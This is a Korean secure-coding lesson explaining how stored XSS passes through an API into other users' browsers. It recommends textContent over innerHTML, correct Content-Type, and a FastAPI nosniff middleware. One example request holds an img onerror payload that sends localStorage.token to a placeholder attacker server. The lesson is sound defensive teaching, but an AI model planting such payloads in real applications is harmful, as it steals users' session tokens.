크로스사이트 스크립트와 API

이 파트의 학습 목표API 응답과 파일 처리에서 생기는 입력데이터 검증 보안약점을 막을 수 있습니다.

API 서버는 HTML 화면을 만들지 않는데도 크로스사이트 스크립트와 무관하지 않습니다. API가 저장하고 내준 값이 다른 사람의 화면에서 실행되는 경로를 봅니다.

저장형 XSS가 API를 거쳐 가는 길

크로스사이트 스크립트(XSS)는 공격자가 넣은 스크립트가 다른 사용자의 브라우저에서 실행되는 공격입니다. 데이터베이스에 저장되었다가 나중에 실행되는 것을 저장형 XSS라고 합니다.

POST /books  {"title": "<img src=x onerror=\"fetch('https://공격자서버/?t='+localStorage.token)\">", ...}

이 제목을 웹 화면이 element.innerHTML = book.title로 넣으면, 브라우저는 제목을 HTML로 해석해 onerror의 스크립트를 실행합니다. 화면을 본 사용자의 토큰이 공격자에게 넘어갑니다. 3일차에 토큰을 localStorage에 두면 위험하다고 한 이유입니다(S5-P18-04).

막는 곳은 출력하는 시점

화면 코드(JavaScript)
element.innerHTML = book.title;   // 위험: HTML로 해석합니다.
element.textContent = book.title; // 안전: 글자 그대로 보여 줍니다.

제목에 <가 들어간 도서도 있을 수 있으므로, API가 입력을 마음대로 지우거나 바꾸지 않습니다. 대신 값을 출력하는 곳이 그곳에 맞게 처리합니다. 화면은 글자로 넣고, React 같은 화면 도구는 기본으로 이렇게 처리합니다. 업무상 특수 문자가 필요 없는 필드라면 입력 단계에서 허용 문자를 정해 한 겹 더 막을 수 있습니다.

API가 지킬 것: Content-Type

상황위험도서 API
JSON을 application/json으로 응답브라우저가 HTML로 실행하지 않습니다.FastAPI의 기본값입니다.
사용자 값을 넣은 HTML을 응답그대로 실행됩니다.HTML 응답을 만들지 않습니다.
사용자가 올린 파일을 내 주소로 내보냄HTML이 담긴 파일을 브라우저가 HTML로 짐작해 실행할 수 있습니다.다음 페이지에서 막습니다.

브라우저는 응답의 Content-Type이 이상해 보이면 내용을 보고 형식을 짐작하는 경우가 있습니다(콘텐츠 스니핑). 응답마다 X-Content-Type-Options: nosniff 헤더를 붙여 짐작하지 말고 Content-Type을 따르라고 지시합니다.

app/main.py
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    # 브라우저가 Content-Type을 무시하고 내용을 보고 형식을 짐작하지 못하게 합니다.
    response.headers["X-Content-Type-Options"] = "nosniff"
    return response
